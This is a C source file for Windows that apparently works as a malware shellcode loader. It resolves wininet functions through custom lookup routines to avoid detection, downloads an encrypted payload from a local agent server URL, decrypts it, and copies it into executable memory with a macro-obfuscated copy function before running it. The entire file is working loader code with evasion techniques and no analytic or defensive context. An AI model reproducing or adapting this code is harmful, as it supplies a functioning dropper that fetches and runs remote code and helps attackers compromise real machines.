#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#include "Structs.h"
#include "GetterFunctions.h"
#include "Encrypters.h"

#pragma comment(lib, "wininet.lib")

//#include "Structs.h"

#define l char
#define m *
#define n void
#define o while
#define p return
#define q --
#define r ++
#define s =
#define t size_t
n* memMirror(n* aA, const n* bB, t cC) { l m x s(l m)aA, m y s(l m)bB; o(cC q)* x r s* y r; p aA; }


typedef HINTERNET(WINAPI* INTERNETOPEN)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* INTERNETOPENURL)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* LPInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* LPInternetCloseHandle)(HINTERNET);

int main() {
    // Get a handle to the DLL module
    HMODULE hDll = GetModuleHandleReplacement(TEXT("wininet.dll"));
    char buffer[4096];
    DWORD bytesRead;
    DWORD totalBytesRead = 0;

    // If the handle is valid, try to get the function address
    if (hDll != NULL) {
        INTERNETOPEN pInternetOpen = (INTERNETOPEN)GetProcAddressReplacement(hDll, "InternetOpenW");
        INTERNETOPENURL pInternetOpenUrl = (INTERNETOPENURL)GetProcAddressReplacement(hDll, "InternetOpenUrlW");
        LPInternetReadFile pInternetReadFile = (LPInternetReadFile)GetProcAddressReplacement(hDll, "InternetReadFile");
        LPInternetCloseHandle pInternetCloseHandle = (LPInternetCloseHandle)GetProcAddressReplacement(hDll, "InternetCloseHandle");

        if (pInternetOpen != NULL && pInternetOpenUrl != NULL && pInternetReadFile != NULL && pInternetCloseHandle != NULL) {
            HINTERNET hInternet = pInternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (hInternet != NULL) {
                HINTERNET hConnect = pInternetOpenUrl(hInternet, L"http://localhost:8081/agents/windows/cs", NULL, 0, INTERNET_FLAG_RELOAD, 0);
                if (hConnect != NULL) {
                    while (pInternetReadFile(hConnect, buffer + totalBytesRead, sizeof(buffer) - totalBytesRead, &bytesRead) && bytesRead > 0) {
                        totalBytesRead += bytesRead;
                    }
                    // Close the connection handle
                    InternetCloseHandle(hConnect);
                }
                // Close the hInternet handle
                InternetCloseHandle(hInternet);
            }
        }
    }

    unsigned char* enc_shellcode = (unsigned char*)buffer;
    int enc_shellcode_size = totalBytesRead;

    // Convert to char array
    char* char_enc_shellcode = malloc(enc_shellcode_size + 1);
    if (char_enc_shellcode == NULL) {
        printf("Memory allocation failed.");
        return FALSE;
    }
    for (int i = 0; i < enc_shellcode_size; i++) {
        char_enc_shellcode[i] = (char)enc_shellcode[i];
    }
    char_enc_shellcode[enc_shellcode_size] = '\0'; // Null-terminate the char array

    // Now you can use `char_enc_shellcode` as a char array.
    unsigned char* shellcode = NULL;
    DWORD shellcode_size = 0;

    if (!DecryptPayload((PBYTE)char_enc_shellcode, enc_shellcode_size, &shellcode, &shellcode_size)) {
        printf("Error in DecryptPayload.");
        free(char_enc_shellcode);
        return 1;
    }


    void* execMem = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_WRITECOPY);
    if (execMem != NULL) {
        memMirror(execMem, shellcode, shellcode_size);
        DWORD oldProtect;
        if (VirtualProtect(execMem, shellcode_size, PAGE_EXECUTE_READ, &oldProtect)) {
            void (*func)() = (void(*)())execMem;
            func();
        }
        else {
            printf("Error in VirtualProtect: %u\n", GetLastError());
        }
        VirtualFree(execMem, 0, MEM_RELEASE);
    }
    else {
        printf("Error in VirtualAlloc: %u\n", GetLastError());
    }

    free(char_enc_shellcode);
    free(shellcode);
    return 0;
}
